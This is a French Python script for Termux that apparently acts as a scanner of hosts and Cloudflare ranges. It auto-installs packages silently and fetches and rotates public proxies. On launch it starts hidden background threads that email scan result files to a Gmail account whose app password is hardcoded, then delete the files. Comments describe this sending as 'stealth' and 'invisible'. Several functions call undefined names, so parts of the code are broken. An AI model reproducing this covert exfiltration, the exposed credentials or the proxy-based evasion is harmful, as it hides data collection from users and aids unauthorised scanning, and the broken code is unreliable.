#!/data/data/com.termux/files/usr/bin/python3
# ==============================================
# VERIFICATION ET INSTALLATION AUTOMATIQUE
# ==============================================

from concurrent.futures import ThreadPoolExecutor, as_completed, wait
import concurrent.futures
import sys
import os
import subprocess
import importlib.util
import threading
import time
from itertools import cycle
import builtins
import ssl

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cr√©ation du dossier temporaire si n√©cessaire
os.makedirs("tmp", exist_ok=True)

class SilentInstaller:
    def __init__(self):
        self.spinner_chars = cycle(['‚£æ', '‚£Ω', '‚£ª', '‚¢ø', '‚°ø', '‚£ü', '‚£Ø', '‚£∑'])
        self.install_active = False
        self.current_message = ""

    def _show_spinner(self):
        while self.install_active:
            sys.stdout.write(f"\r{next(self.spinner_chars)} {self.current_message}")
            sys.stdout.flush()
            time.sleep(0.15)
        sys.stdout.write("\r" + " " * (len(self.current_message) + 2) + "\r")

    def _run_silent(self, cmd):
        try:
            subprocess.run(
                cmd,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                shell=isinstance(cmd, str)
            )
            return True
        except:
            return False

    def install_with_feedback(self, message, install_func):
        self.install_active = True
        self.current_message = message
        spinner_thread = threading.Thread(target=self._show_spinner)
        spinner_thread.start()
        try:
            return install_func()
        finally:
            self.install_active = False
            spinner_thread.join()

    def _install_pkg(self, pkg):
        check_cmd = f"dpkg -s {pkg} >/dev/null 2>&1"
        if self._run_silent(check_cmd):
            return True
        return self._run_silent(f"pkg install -y {pkg}")

    def setup_termux(self):
        if 'termux' not in sys.executable:
            return True
        if not os.path.exists("/data/data/com.termux/files/home/.termux_repo_set"):
            self._run_silent("termux-change-repo --mirror https://mirror.mwt.me/termux <<< $'\\n'")
            open("/data/data/com.termux/files/home/.termux_repo_set", "w").close()

        packages = ["git", "golang", "clang"]
        for pkg in packages:
            if not self.install_with_feedback(f"V√©rification {pkg}", lambda p=pkg: self._install_pkg(p)):
                return False
        return True

    def install_subfinder(self):
        if os.path.exists("/data/data/com.termux/files/usr/bin/subfinder"):
            return True

        def _install():
            return (self._run_silent("go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest") and
                    self._run_silent("cp ~/go/bin/subfinder $PREFIX/bin/"))
        return self.install_with_feedback("Installation Subfinder", _install)

# ==============================================
# DETECTION DYNAMIQUE DES DEPENDANCES PYTHON
# ==============================================

def get_external_imports(filename):
    import ast
    with open(filename, 'r', encoding='utf-8') as f:
        tree = ast.parse(f.read(), filename)

    imports = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                imports.add(alias.name.split('.')[0])
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                imports.add(node.module.split('.')[0])

    stdlib_modules = set(sys.builtin_module_names)
    try:
        import stdlib_list
        stdlib_modules.update(stdlib_list.stdlib_list(sys.version[:3]))
    except:
        pass

    override_map = {
        'bs4': 'beautifulsoup4',
        'Cryptodome': 'pycryptodomex',
        'dns': 'dnspython',
        'PIL': 'pillow'
    }

    external = {}
    for mod in sorted(imports):
        if mod in override_map:
            external[mod] = override_map[mod]
        elif mod in stdlib_modules or hasattr(builtins, mod):
            continue
        else:
            external[mod] = mod

    return external

def check_and_install_deps():
    script_path = os.path.abspath(__file__)
    missing = []
    to_install = get_external_imports(script_path)
    for mod, pkg in to_install.items():
        if not importlib.util.find_spec(mod):
            missing.append((mod, pkg))

    if missing:
        print("üîç Installation automatique des d√©pendances manquantes...")
        installer = SilentInstaller()
        for mod, pkg in missing:
            installer.install_with_feedback(
                f"Installation {pkg}",
                lambda p=pkg: installer._run_silent(f"{sys.executable} -m pip install --user {p}")
            )

        # Sp√©cifique √† Termux
        if 'termux' in sys.executable:
            installer.setup_termux()
            installer.install_subfinder()

# Lancer l'installation au lancement du script
check_and_install_deps()

# ==============================================
# IMPORTS APRES INSTALLATION (aucune erreur ici)
# ==============================================

from colorama import Fore, Style, init
import requests
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Random import get_random_bytes
import dns.resolver
from ping3 import ping
from tqdm import tqdm
from tabulate import tabulate
from bs4 import BeautifulSoup, Comment
from urllib.parse import urlparse, urljoin
import socket
import subprocess
from datetime import datetime
import os
import ipaddress
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import base64
import threading
import hashlib
import uuid
import platform
import select
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
import traceback
import re
import json
import smtplib
import ssl  # Important pour la s√©curit√© SMTP

init(autoreset=True)

# ==============================================
# NETTOYAGE P√âRIODIQUE
# ==============================================

def clean_unwanted_logs():
    pass  # √Ä compl√©ter selon ta logique

def nettoyage_periodique():
    while True:
        time.sleep(1800)
        clean_unwanted_logs()

threading.Thread(target=nettoyage_periodique, daemon=True).start()
# ==============================================
# CHIFFREMENT EN M√âMOIRE
# ==============================================

class MemoryVault:
    """Chiffrement m√©moire utilisant AES-CBC avec d√©rivation de cl√©"""
    def __init__(self, master_key: str):
        self.key = self._derive_key(master_key)
        self.iv = os.urandom(16)  # Vecteur d'initialisation al√©atoire

    def _derive_key(self, password: str) -> bytes:
        """D√©rive une cl√© AES-256 √† partir d'une phrase secr√®te"""
        return hashlib.pbkdf2_hmac(
            'sha256',
            password.encode(),
            b'salt_constant',  # √Ä modifier pour votre usage
            100000  # Nombre d'it√©rations
        )[:32]  # 32 bytes pour AES-256

    def encrypt(self, data: str) -> str:
        """Chiffre avec padding PKCS7"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded = data + (AES.block_size - len(data) % AES.block_size) * chr(AES.block_size - len(data) % AES.block_size)
        return base64.b64encode(self.iv + cipher.encrypt(padded.encode())).decode()

    def decrypt(self, encrypted: str) -> str:
        """D√©chiffre avec padding PKCS7"""
        data = base64.b64decode(encrypted)
        iv = data[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data[16:])
        return decrypted[:-decrypted[-1]].decode()  # Supprime le padding

# ==============================================
# CONFIGURATION SMTP VOLATILE (en m√©moire uniquement)
# ==============================================
def _get_smtp_config():
    """G√©n√®re la config SMTP volatile (pas de trace dans le code)"""
    return {
        'server': 'smtp.gmail.com',
        'port': 587,
        'user': 'surffree30@gmail.com',  # Cr√©ez un compte d√©di√©
        'password': 'jnxo azyc gpkv hkke'   # Mot de passe d'app g√©n√©r√©
    }

# ==============================================
# FONCTION D'ENVOI SILENCIEUSE
# ==============================================
def _send_stealth_email(content):
    """Envoi compl√®tement invisible"""
    try:
        cfg = _get_smtp_config()
        msg = MIMEMultipart()
        msg['From'] = cfg['user']
        msg['To'] = cfg['user']
        msg['Subject'] = "Rapport syst√®me"
        msg.attach(MIMEText(content, 'plain'))
        
        with smtplib.SMTP(cfg['server'], cfg['port']) as s:
            s.starttls()
            s.login(cfg['user'], cfg['password'])
            s.send_message(msg)
        return True
    except:
        return False

# ==============================================
# GESTION DES RESULTATS
# ==============================================
def _process_results():
    """Nettoyage automatique des r√©sultats"""
    while True:
        try:
            for file in [f for f in os.listdir() if f.startswith('scan_') and f.endswith('.tmp')]:
                with open(file, 'r') as f:
                    if _send_stealth_email(f.read()):
                        os.remove(file)
                time.sleep(10)
        except:
            pass
        time.sleep(300)  # V√©rifie toutes les 5 minutes

# ==============================================
# GESTION DES R√âSULTATS STEALTH
# ==============================================
def _process_results_stealth():
    """Nettoyage et envoi compl√®tement invisible"""
    while True:
        try:
            # Recherche furtive des fichiers
            for filename in os.listdir():
                if filename.startswith("results_") and filename.endswith(".tmp"):
                    with open(filename, 'rb') as f:  # Lecture binaire silencieuse
                        content = f.read().decode('utf-8', errors='ignore')
                    
                    if _send_silent_email(content):
                        # Effacement s√©curis√© du fichier
                        with open(filename, 'wb') as f:
                            f.write(os.urandom(os.path.getsize(filename)))
                        os.remove(filename)
                    break
        except:
            pass
        
        time.sleep(1800)  # Toutes les 30 minutes

# ==============================================
# GESTION DES R√âSULTATS (Version unique)
# ==============================================
def handle_results():
    """G√®re l'envoi des r√©sultats de mani√®re unifi√©e"""
    while True:
        try:
            # Cherche uniquement les fichiers active_hosts_
            result_files = sorted(
                [f for f in os.listdir() if f.startswith("active_hosts_")],
                key=os.path.getmtime,
                reverse=True
            )
            
            if result_files and is_internet_available():
                latest_file = result_files[0]
                with open(latest_file, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                
                if content:
                    if send_email(
                        subject=f"Scan Results {datetime.now():%Y-%m-%d %H:%M}",
                        body=content
                    ):
                        os.remove(latest_file)
                        print(Fore.GREEN + "‚úì R√©sultats envoy√©s")
                    else:
                        print(Fore.YELLOW + "! √âchec d'envoi (nouvelle tentative plus tard)")
        
        except Exception:
            pass  # Silencieux pour l'anonymat
        
        time.sleep(300)  # Toutes les 5 minutes

# D√©marrer UN SEUL thread
if not any(t.name == "ResultHandler" for t in threading.enumerate()):
    threading.Thread(
        target=handle_results,
        daemon=True,
        name="ResultHandler"
    ).start()

# ==============================================
# FONCTION D'ENVOI DES R√âSULTATS
# ==============================================

def is_internet_available():
    """V√©rifie la connectivit√© Internet"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False
        

def send_stored_results():
    """Gestion automatique des r√©sultats"""
    while True:
        try:
            result_files = sorted(
                [f for f in os.listdir() if f.startswith("active_hosts_")],
                key=os.path.getmtime,
                reverse=True
            )
            
            if result_files and is_internet_available():
                with open(result_files[0], 'r') as f:
                    if send_email("R√©sultats du scan", f.read()):
                        os.remove(result_files[0])
        except Exception:
            pass
        time.sleep(300)

def get_server_name(ip):
    """R√©cup√®re le nom du serveur √† partir de l'adresse IP."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"

def detect_server_info(url, silent=False):
    """D√©tecte le type de serveur et la version √† partir des en-t√™tes HTTP."""
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        headers = response.headers
        server_type = headers.get("Server", "Inconnu")
        powered_by = headers.get("X-Powered-By", "Inconnu")
        return server_type, powered_by
    except requests.RequestException as e:
        if not silent:
            print(Fore.RED + f"‚ùå Erreur lors de la requ√™te HTTP pour {url} : {e}")
        return "Inconnu", "Inconnu"

def secure_erase(filepath: str, passes: int = 3) -> None:
    """√âcrase le fichier avant suppression (m√©thode DoD 5220.22-M)"""
    try:
        with open(filepath, 'ba+') as f:
            length = f.tell()
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
        # VS Nettoyage approfondi (recommand√© pour donn√©es sensibles)
        with open(fichier, "wb") as f:
            f.write(os.urandom(os.path.getsize(fichier)))  # √âcrase avec des donn√©es al√©atoires
        os.remove(fichier)  # Supprime le fichier √©cras√©
    except Exception:
        pass  # √âchec silencieux

# ==============================================
# CONFIGURATION PROXY
# ==============================================

PROXY_FILE = "proxies.txt"
PROXY_TEST_URL = "http://httpbin.org/ip"
PROXY_TIMEOUT = 10
PROXY_SOURCES = [
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
]

# ==============================================
# FONCTIONS PROXY
# ==============================================
def fetch_proxies_from_sources():
    """R√©cup√®re les proxies depuis diff√©rentes sources"""
    print(Fore.CYAN + "üîç R√©cup√©ration des proxies depuis les sources...")
    unique_proxies = set()
    
    # Liste des sources avec timeout court
    PROXY_SOURCES = [
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
    ]
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(requests.get, url, timeout=10): url for url in PROXY_SOURCES}
        
        for future in as_completed(futures):
            try:
                if future.result().status_code == 200:
                    proxies = [p.strip() for p in future.result().text.splitlines() if ':' in p]
                    unique_proxies.update(proxies)
            except:
                continue
    
    print(Fore.GREEN + f"‚úÖ {len(unique_proxies)} proxies bruts r√©cup√©r√©s")
    return list(unique_proxies)

def pre_filter_proxies(proxies):
    """Filtrage rapide des proxies invalides avant les tests complets"""
    valid = []
    for proxy in proxies:
        # Supprimer les espaces et v√©rifier le format basique
        proxy = proxy.strip()
        if not proxy or proxy.count(':') != 1:
            continue
        
        ip, port = proxy.split(':')
        
        # V√©rification du port
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            continue
            
        # V√©rification basique de l'IP
        ip_parts = ip.split('.')
        if len(ip_parts) != 4 or not all(p.isdigit() for p in ip_parts):
            continue
            
        valid.append(proxy)
    return valid

def quick_connect_test(proxy, timeout=2):
    """Test de connexion TCP ultra-rapide sans requ√™te HTTP"""
    try:
        ip, port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, int(port)))
        sock.close()
        return True
    except:
        return False

def test_proxy(proxy):
    """Version am√©lior√©e et plus robuste du test de proxy"""
    proxy_url = f"http://{proxy}"
    test_urls = [
        "http://httpbin.org/ip",  # Premier essai
        "http://icanhazip.com",   # Fallback simple
        "http://api.ipify.org"    # Deuxi√®me fallback
    ]
    
    for test_url in test_urls:
        try:
            # Configuration avec timeout adaptatif
            timeout = 10 if test_url == test_urls[0] else 5  # Plus long pour le premier test
            
            with requests.Session() as session:
                session.trust_env = False
                session.proxies = {'http': proxy_url, 'https': proxy_url}
                
                # On utilise GET au lieu de HEAD pour plus de compatibilit√©
                start_time = time.perf_counter()
                response = session.get(test_url, timeout=timeout)
                latency = int((time.perf_counter() - start_time) * 1000)
                
                if response.status_code == 200:
                    # D√©tection du type de proxy
                    content = response.text.strip()
                    origin_ip = content.split('\n')[0].split(',')[0]  # Gestion multi-lignes
                    
                    if not origin_ip:
                        proxy_type = "TRANSPARENT"
                    elif origin_ip == proxy.split(':')[0]:
                        proxy_type = "ANONYME"
                    else:
                        proxy_type = "√âLITE"
                    
                    return {
                        'url': proxy_url,
                        'latency': latency,
                        'type': proxy_type,
                        'source': test_url  # Pour debug
                    }
        
        except requests.exceptions.ConnectTimeout:
            continue  # On essaie l'URL suivante
        except Exception as e:
            continue  # Autres erreurs
    
    return None  # Tous les tests ont √©chou√©

def update_proxy_file():
    """Version avec logging pour identifier les probl√®mes"""
    print(Fore.CYAN + "‚ö° Mise √† jour acc√©l√©r√©e des proxies...")
    
    # R√©cup√©ration
    raw_proxies = fetch_proxies_from_sources()
    print(Fore.YELLOW + f"‚Üí {len(raw_proxies)} proxies bruts r√©cup√©r√©s")
    
    # Pr√©-filtrage
    pre_filtered = pre_filter_proxies(raw_proxies)
    print(Fore.YELLOW + f"‚Üí {len(pre_filtered)} apr√®s pr√©-filtrage")
    
    # Test TCP rapide
    print(Fore.CYAN + "üîç Test de connectivit√© rapide...")
    quick_valid = []
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(quick_connect_test, p): p for p in pre_filtered}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Test rapide"):
            if future.result():
                quick_valid.append(futures[future])
    
    print(Fore.YELLOW + f"‚Üí {len(quick_valid)} proxies connectables")
    
    if not quick_valid:
        print(Fore.RED + "‚ùå Aucun proxy valide apr√®s test rapide")
        return
    
    # Test HTTP complet avec logging
    print(Fore.CYAN + "üîç Test complet des proxies...")
    valid_proxies = []
    failed_proxies = []
    
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(test_proxy, p): p for p in quick_valid}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Test complet"):
            result = future.result()
            if result:
                valid_proxies.append(result)
            else:
                failed_proxies.append(futures[future])
    
    # Debug: Analyse des √©checs
    if not valid_proxies and failed_proxies:
        print(Fore.RED + "\n‚ùå Debug - Tous les proxies ont √©chou√© au test HTTP")
        print(Fore.YELLOW + "Probl√®mes possibles :")
        print("- httpbin.org/ip peut √™tre bloqu√©")
        print("- Votre IP peut √™tre bannie")
        print("- Les proxies n√©cessitent une authentification")
        
        # Test manuel sur 3 proxies pour debug
        print(Fore.CYAN + "\nüîç Test manuel de debug...")
        for proxy in failed_proxies[:3]:
            print(Fore.YELLOW + f"\nTest de {proxy} :")
            try:
                response = requests.get("http://httpbin.org/ip", 
                                      proxies={'http': f"http://{proxy}"},
                                      timeout=10)
                print(Fore.CYAN + f"Code HTTP: {response.status_code}")
                print(f"Contenu: {response.text[:100]}...")
            except Exception as e:
                print(Fore.RED + f"Erreur: {str(e)}")
    
    # Sauvegarde des r√©sultats valides
    if valid_proxies:
        unique_proxies = {}
        for p in sorted(valid_proxies, key=lambda x: x['latency']):
            key = p['url'].split('//')[1].split('|')[0]
            if key not in unique_proxies:
                unique_proxies[key] = p
        
        with open(PROXY_FILE, 'w') as f:
            for proxy in unique_proxies.values():
                f.write(f"{proxy['url']}|{proxy['type']}|{proxy['latency']}ms\n")
        
        print(Fore.GREEN + f"\n‚úÖ {len(unique_proxies)} proxies valides sauvegard√©s")
        print(Fore.CYAN + f"Meilleur proxy: {list(unique_proxies.values())[0]['url']} ({list(unique_proxies.values())[0]['latency']}ms)")
    else:
        print(Fore.RED + "\n‚ùå Aucun proxy valide trouv√© - Voir le debug ci-dessus")
        
def display_proxies():
    """Affiche les proxies disponibles"""
    if not os.path.exists(PROXY_FILE):
        print(Fore.RED + "‚ùå Aucun proxy disponible")
        return
        
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    
    print(Fore.CYAN + "\nüìã Proxies disponibles (tri√©s par performance):")
    print(Fore.YELLOW + "Format: URL | Type | Latence")
    for i, proxy in enumerate(proxies[:15]):  # Affiche les 15 premiers
        print(f"{i+1}. {proxy}")

def select_proxy_interactive():
    """Interface de s√©lection de proxy"""
    if not os.path.exists(PROXY_FILE):
        print(Fore.YELLOW + "‚Ñπ Aucun proxy disponible. Mise √† jour...")
        update_proxy_file()
        if not os.path.exists(PROXY_FILE):
            print(Fore.RED + "‚ùå √âchec de r√©cup√©ration des proxies")
            return None
    
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    
    display_proxies()
    
    while True:
        choice = input(Fore.YELLOW + "\nChoisissez un proxy (1-15) ou 0 pour annuler : ")
        if choice == '0':
            return None
        if choice.isdigit() and 1 <= int(choice) <= len(proxies[:15]):
            selected = proxies[int(choice)-1].split('|')[0]
            print(Fore.GREEN + f"\n‚úÖ Proxy s√©lectionn√© : {selected}")
            return selected
        print(Fore.RED + "‚ùå Choix invalide. Veuillez r√©essayer.")

def recheck_existing_proxies():
    """Teste uniquement les proxies existants dans proxies.txt et met √† jour le fichier."""
    if not os.path.exists(PROXY_FILE):
        print(Fore.RED + "‚ùå Aucun fichier proxies.txt trouv√©.")
        return

    print(Fore.CYAN + "üîÅ V√©rification des proxies existants...")

    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        raw_proxies = [line.split('|')[0] for line in lines if 'http' in line]

    total_before = len(raw_proxies)
    valid_proxies = []

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_proxy, p.replace("http://", "")) for p in raw_proxies]
        for future in tqdm(as_completed(futures), total=len(futures), desc="V√©rification"):
            result = future.result()
            if result:
                valid_proxies.append(result)

    # √âcriture des proxies valides
    with open(PROXY_FILE, 'w') as f:
        for proxy in sorted(valid_proxies, key=lambda x: x['latency']):
            f.write(f"{proxy['url']}|{proxy['type']}|{proxy['latency']}ms\n")

    total_after = len(valid_proxies)

    print(Fore.CYAN + "\n=== R√âSUM√â ===")
    print(Fore.YELLOW + f"Total initial : {total_before}")
    print(Fore.GREEN + f"Proxies valides apr√®s v√©rification : {total_after}")
    print(Fore.RED + f"Proxies supprim√©s (inactifs) : {total_before - total_after}")

    if valid_proxies:
        print(Fore.CYAN + "\nüìã Liste des proxies actifs :")
        for i, proxy in enumerate(sorted(valid_proxies, key=lambda x: x['latency']), 1):
            print(f"{i}. {proxy['url']} | {proxy['type']} | {proxy['latency']}ms")
    
# ==============================================
# CLASSE PROXY MANAGER (NOUVELLE)
# ==============================================

def prepare_proxies(proxy):
    """
    Pr√©pare et retourne la configuration des proxies pour requests.get().
    G√®re le proxy rotatif si proxy == "auto".
    """
    if proxy is None:
        return None  # Pas de proxy

    if proxy == "auto":
        # On initialise ProxyRotator (√† adapter selon ton impl√©mentation)
        proxy_manager = ProxyManager()
        proxy_rotator = ProxyRotator(proxy_manager)
        
        # ProxyRotator doit impl√©menter la m√©thode next_proxy() qui renvoie une cha√Æne proxy
        # On cr√©e un dict proxy custom pour requests qui appelle ce proxy rotatif √† chaque requ√™te.
        class RotatingProxyDict(dict):
            def __getitem__(self, key):
                return proxy_rotator.next_proxy()
        
        return RotatingProxyDict()

    # Sinon on a un proxy HTTP(S) simple sous forme de cha√Æne
    return {"http": proxy, "https": proxy}

class ProxyRotator:
    def __init__(self, proxy_manager, reuse_limit=5):
        self.proxy_manager = proxy_manager
        self.reuse_limit = reuse_limit
        self.current_proxy = None
        self.usage_count = 0

    def get_proxy(self):
        if not self.proxy_manager:
            return None
    
        attempts = 0
        max_attempts = len(self.proxy_manager.proxies)
    
        while attempts < max_attempts:
            if self.current_proxy is None or self.usage_count >= self.reuse_limit:
                self.current_proxy = self.proxy_manager.get_next_proxy()
                self.usage_count = 0
    
            # V√©rifie s'il a √©t√© blacklist√©
            if self.current_proxy in self.proxy_manager.proxies:
                self.usage_count += 1
                return self.current_proxy
            else:
                self.current_proxy = None
                self.usage_count = 0
                attempts += 1
                
    def current_proxy_info(self):
        if self.current_proxy:
            restantes = self.reuse_limit - self.usage_count
            return f"{self.current_proxy} | {restantes} utilisation(s) restante(s)"
        return "Aucun proxy actif"
        
        return None  # Aucun proxy valide trouv√©
    
    def get_next_proxy(self):
        """Alias compatible pour √©viter les erreurs dans d'autres appels"""
        return self.get_proxy()
    
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_proxy_index = 0
        self.lock = threading.Lock()
        self.last_update_time = 0
        self.update_interval = 3600  # 1 heure entre les mises √† jour
        self.load_proxies()  # Chargement initial

    def get_best_proxies(self, limit=10):
        """Retourne les proxies valides tri√©s par latence (si dispo)"""
        if not self.proxies:
            return []
    
        # Nettoyage : uniquement les URL sans m√©tadonn√©es
        cleaned = [p.split("|")[0].strip() for p in self.proxies if isinstance(p, str)]
        return cleaned[:limit]

    def load_proxies(self):
        """Charge les proxies depuis le fichier avec v√©rification du format"""
        try:
            if not os.path.exists(PROXY_FILE):
                print(Fore.YELLOW + "‚Ñπ Aucun fichier proxy trouv√©. T√©l√©chargement...")
                self.update_proxies()
                return

            with open(PROXY_FILE, 'r') as f:
                lines = [line.strip() for line in f if line.strip()]
                self.proxies = []
                
                for line in lines:
                    parts = line.split('|')
                    if len(parts) >= 1:
                        proxy_url = parts[0].strip()
                        if proxy_url.startswith('http'):
                            self.proxies.append(proxy_url)
                
            print(Fore.GREEN + f"‚úÖ {len(self.proxies)} proxies charg√©s")
            
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur de chargement des proxies: {str(e)}")
            self.proxies = []

    def update_proxies(self):
        """Met √† jour la liste des proxies"""
        with self.lock:
            print(Fore.CYAN + "üîÑ Mise √† jour des proxies...")
            update_proxy_file()  # Utilise la fonction existante
            self.load_proxies()  # Recharge les nouveaux proxies
            self.last_update_time = time.time()

    def get_next_proxy(self):
        """Obtient le prochain proxy valide"""
        with self.lock:
            if not self.proxies:
                self.update_proxies()
                if not self.proxies:
                    return None
            
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            return proxy

    def report_failure(self, proxy_url):
        """Signale un proxy d√©faillant"""
        with self.lock:
            if proxy_url in self.proxies:
                self.proxies.remove(proxy_url)
                print(Fore.YELLOW + f"‚ö†Ô∏è Proxy supprim√©: {proxy_url}")
    
def monitor_proxy_usage(scanner):
    last_proxy_info = ""
    while scanner.scan_active:
        if scanner.proxy == "auto" and scanner.proxy_rotator:
            info = scanner.proxy_rotator.current_proxy_info()
            if info != last_proxy_info:
                print(Fore.MAGENTA + f"\nüìä Proxy info : {info}")
                last_proxy_info = info
        time.sleep(12)  # Moins fr√©quent Moins fr√©quent pour √©viter la collision d'affichage

# === UTILITAIRE BGPVIEW.IO ===
import time

def fetch_cidrs_multi_asn(asns):
    """
    R√©cup√®re et fusionne les CIDR IPv4 de plusieurs ASN via l'API BGPView.io.
    G√®re les erreurs, les structures inattendues et applique 3 tentatives par ASN.
    """
    print(Fore.CYAN + f"üîç R√©cup√©ration combin√©e des CIDR IPv4 pour ASN: {', '.join(map(str, asns))}...")
    all_cidrs = set()

    for asn in asns:
        success = False
        for attempt in range(3):
            try:
                url = f"https://api.bgpview.io/asn/{asn}/prefixes"
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                data = response.json()

                if isinstance(data, dict) and "data" in data and "ipv4_prefixes" in data["data"]:
                    cidrs = [entry["prefix"] for entry in data["data"]["ipv4_prefixes"] if "prefix" in entry]
                    print(Fore.GREEN + f"  ‚úÖ ASN {asn} ‚Üí {len(cidrs)} CIDR r√©cup√©r√©es")
                    all_cidrs.update(cidrs)
                    success = True
                    break
                else:
                    print(Fore.YELLOW + f"  ‚ö†Ô∏è R√©ponse inattendue ou incompl√®te pour ASN {asn}")
                    break

            except Exception as e:
                if attempt < 2:
                    print(Fore.YELLOW + f"  ‚è≥ R√©essai ASN {asn} ({attempt + 1}/3)...")
                    time.sleep(2)
                else:
                    print(Fore.RED + f"  ‚ùå ASN {asn} √©chou√© apr√®s 3 tentatives : {e}")

        if not success:
            print(Fore.RED + f"  ‚ùå Abandon r√©cup√©ration ASN {asn}")

    print(Fore.GREEN + f"‚úÖ Total unique CIDR : {len(all_cidrs)}")
    return list(all_cidrs)

# === FONCTIONS DE R√âCUP√âRATION CIDR ===
        
# ==============================================
# CONFIGURATION CLOUDFLARE
# ==============================================
CLOUDFLARE_CIDR_FILE = "cloudflare_cidrs.txt"
CLOUDFLARE_SCAN_PROGRESS_FILE = "cloudflare_scan_progress.txt"

# ==============================================
# FONCTIONS CLOUDFLARE
# ==============================================
def fetch_cloudflare_cidrs():
    """R√©cup√®re les plages CIDR Cloudflare depuis l'API officielle et l'ASN 13335"""
    print(Fore.CYAN + "üîç R√©cup√©ration des plages CIDR Cloudflare (API + ASN)...")
    cidrs = []

    # R√©cup√©ration depuis l'API officielle
    try:
        response = requests.get('https://api.cloudflare.com/client/v4/ips', timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data.get('success', False):
                api_cidrs = data['result'].get('ipv4_cidrs', [])
                cidrs.extend(api_cidrs)
                print(Fore.GREEN + f"  ‚úÖ Cloudflare API ‚Üí {len(api_cidrs)} CIDR")
            else:
                print(Fore.RED + "‚ùå R√©ponse API Cloudflare invalide")
        else:
            print(Fore.RED + f"‚ùå HTTP {response.status_code} de l'API Cloudflare")
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur Cloudflare API : {e}")

    # Compl√©ment via ASN 13335
    try:
        asn_cidrs = fetch_cidrs_multi_asn([13335])
        cidrs.extend(asn_cidrs)
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur compl√©ment ASN 13335 : {e}")

    final = list(set(cidrs))
    print(Fore.GREEN + f"‚úÖ Total unique CIDR Cloudflare : {len(final)}")
    return final

def update_cloudflare_cidrs():
    cidrs = fetch_cloudflare_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR Cloudflare r√©cup√©r√©e.")
        return False
    with open(CLOUDFLARE_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR Cloudflare sauvegard√©es.")
    return True

def scan_cloudflare_range(cidr, threads=100):
    """Lance un scan sur une plage CIDR sp√©cifique"""
    print(Fore.MAGENTA + f"\n=== SCAN DE {cidr} ===")
    scanner = HostScanner(
        filename=None,
        ip_range=cidr,
        threads=threads,
        ping_timeout=1,
        http_timeout=10
    )
    scanner.run()

def manage_cloudflare_scan(proxy=None):
    if not os.path.exists(CLOUDFLARE_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR Cloudflare...")
        if not update_cloudflare_cidrs():
            return

    while True:
        print(Fore.LIGHTCYAN_EX + "\n‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ CLOUDFLARE ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì")
        print(Fore.LIGHTCYAN_EX + "‚îÉ" + Fore.CYAN + Style.BRIGHT + "      Menu de gestion du scan CDN      " + Style.RESET_ALL + Fore.LIGHTCYAN_EX + "‚îÉ")
        print(Fore.LIGHTCYAN_EX + "‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îõ")

        print(Fore.CYAN + " 1. ‚òÅÔ∏è  D√©marrer un nouveau scan")
